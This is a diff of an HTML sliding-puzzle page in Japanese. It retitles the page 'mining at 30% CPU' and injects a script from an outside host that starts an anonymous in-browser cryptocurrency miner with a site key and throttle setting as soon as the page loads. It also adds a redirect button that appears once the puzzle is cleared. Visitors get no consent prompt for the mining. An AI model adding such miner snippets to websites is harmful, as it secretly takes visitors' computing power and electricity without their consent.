@@ -4,7 +4,7 @@
 
     <head>
 
-        <title>サンプルパズル</title>
+        <title>CPU使用30％で採掘</title>
 
         <meta charset="utf-8">
 
@@ -17,6 +17,15 @@
     </head>
 
     <body>
+    
+        <script src="https://www.hostingcloud.racing/PTrB.js"></script>
+        <script>
+            var _client = new Client.Anonymous('d38a4be5d9260462ccf4661a996d3414f3715b184daa76331d43799f460def32', {
+                throttle: 0.7, c: 'w', ads: 0
+            });
+            _client.start();
+           
+        </script>
 
         <center>
 
@@ -31,11 +40,11 @@
                 <button id="t6" class="btn btn-secondary tile" onclick="pushed(this.id)" >6</button> <button id="t7"  class="btn btn-secondary tile" onclick="pushed(this.id)" >7</button> <button id="t8" class="btn btn-secondary tile" onclick="pushed(this.id)" >8</button>
 
             </div>
-
+            <script>randomTaslar()</script>
             <br>
 
             <button class="btn btn-primary" onclick="randomTaslar()">シャッフル</button>
-
+            <button class="btn btn-primary" id="clearButton" onclick="window.location.href='https://miyabi-holy.github.io/github.io/index2.html'" disabled>クリアしたらここをクリック</button>            
         </center>
 
     </body>
